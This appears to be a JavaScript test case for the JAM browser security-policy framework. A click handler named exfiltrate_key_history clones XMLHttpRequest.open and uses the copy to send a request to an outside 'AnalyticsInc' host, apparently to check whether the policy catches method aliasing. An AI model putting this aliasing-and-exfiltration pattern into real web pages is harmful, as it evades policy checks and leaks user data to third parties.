
JAM.startProfile('load');
introspect(JAM.policy.pFull) {
function clone(obj$$16) {
  if (obj$$16 == null || typeof obj$$16 != "object") {
    return obj$$16;
  }
  var temp = {};
  var key$$14;
  for (key$$14 in obj$$16) {
    temp[key$$14] = clone(obj$$16[key$$14]);
  }
  return temp;
}
function clone2(obj$$17) {
  if (obj$$17.cloneNode) {
    return obj$$17.cloneNode(true);
  }
  var copy = obj$$17 instanceof Array ? [] : {};
  var attr;
  for (attr in obj$$17) {
    if (typeof obj$$17[attr] == "function" || obj$$17[attr] == null || !obj$$17[attr].clone2) {
      copy[attr] = obj$$17[attr];
    } else {
      if (obj$$17[attr] == obj$$17) {
        copy[attr] = copy;
      } else {
        copy[attr] = obj$$17[attr].clone2();
      }
    }
  }
  return copy;
}
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  xmlhttp.opennew = clone(xmlhttp.open);
  xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone1", true);
  xmlhttp.send(null);
}
document.getElementById("test").onclick = exfiltrate_key_history

}

JAM.stopProfile('load');
